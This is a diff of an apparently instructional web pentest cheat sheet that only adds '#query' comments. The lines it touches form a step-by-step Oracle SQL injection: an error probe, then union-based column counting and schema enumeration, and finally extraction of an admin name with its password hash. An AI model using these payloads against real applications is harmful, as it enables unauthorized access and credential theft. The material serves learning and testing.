@@ -209,32 +209,32 @@ https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pe
 ````
 ' 
 Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
-' OR 1=1 -- 
+' OR 1=1 -- #query
 Blog entry from Chris with title The Great Escape from 2017
 Blog entry from Bob with title I Love Crypto from 2016
 Blog entry from Alice with title Man-in-the-middle from 2018
 Blog entry from Chris with title To Paris and Back from 2019
 Blog entry from Maria with title Software Development Lifecycle from 2018
 Blog entry from Eric with title Accounting is Fun from 2019
-' union select 1,2,3,4,5,6--
+' union select 1,2,3,4,5,6-- #query
 java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
  ' union select 1,2,3,4,5,6 from dual-- #Adjust for more or less columns
 java.sql.SQLSyntaxErrorException: ORA-01789: query block has incorrect number of result columns
  ' union select 1,2,3 from dual-- #adjusted columns
 java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype as corresponding expression ORA-01790: expression must have same datatype as corresponding expression 
- ' union select null,null,null from dual--
+ ' union select null,null,null from dual-- #query
 Blog entry from null with title null from 0
-' union select user,null,null from dual--
+' union select user,null,null from dual-- #query
 Blog entry from WEB_APP with title null from 0
-' union select table_name,null,null from all_tables--
+' union select table_name,null,null from all_tables-- #query
 Blog entry from WEB_ADMINS with title null from 0
 Blog entry from WEB_CONTENT with title null from 0
 Blog entry from WEB_USERS with title null from 0
-' union select column_name,null,null from all_tab_columns where table_name='WEB_ADMINS'--
+' union select column_name,null,null from all_tab_columns where table_name='WEB_ADMINS'-- #query
 Blog entry from ADMIN_ID with title null from 0
 Blog entry from ADMIN_NAME with title null from 0
 Blog entry from PASSWORD with title null from 0
-' union select ADMIN_NAME||PASSWORD,null,null from WEB_ADMINS--
+' union select ADMIN_NAME||PASSWORD,null,null from WEB_ADMINS-- #query
 Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
 ````
 ### SSRF
